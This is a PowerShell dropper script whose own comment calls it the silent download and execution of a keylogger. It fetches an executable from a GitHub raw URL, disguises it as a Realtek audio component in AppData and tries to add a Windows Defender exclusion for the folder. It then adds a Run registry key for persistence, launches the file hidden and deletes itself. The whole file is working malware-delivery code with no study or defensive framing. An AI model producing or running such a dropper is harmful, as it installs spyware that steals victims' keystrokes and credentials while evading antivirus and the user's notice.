# Silent download and execution of the keylogger exe + attempt folder exclusion

$exeUrl = "https://github.com/webhookrepo195/mypresonalwebhookfile109/raw/refs/heads/main/Realtek%20Audio%20device.exe"

# No spaces in filename
$exePath = "$env:APPDATA\Realtek\RealtekAudioDevice.exe"

# Create hidden folder if needed
$folder = "$env:APPDATA\Realtek"
if (-not (Test-Path $folder)) { New-Item -ItemType Directory -Path $folder -Force }

# Attempt to add exclusion for the folder (requires admin, will fail silently if not elevated)
try {
    Add-MpPreference -ExclusionPath $folder -ErrorAction SilentlyContinue
    # You can also exclude just the file: Add-MpPreference -ExclusionProcess $exePath
} catch {
    # Fail silently - most common outcome without elevation
}

try {
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
} catch {
    # Fail silently
}

# If download succeeded, try exclusion again after drop (sometimes timing helps)
if (Test-Path $exePath) {
    try {
        Add-MpPreference -ExclusionPath $folder -ErrorAction SilentlyContinue
    } catch {}
}

# Add to current user startup (no admin needed)
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "RealtekAudioHelper"
Set-ItemProperty -Path $regPath -Name $regName -Value $exePath -Force -ErrorAction SilentlyContinue

# Run hidden
Start-Process -FilePath $exePath -WindowStyle Hidden -ErrorAction SilentlyContinue

# Self-delete the .ps1
Remove-Item -Path $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue

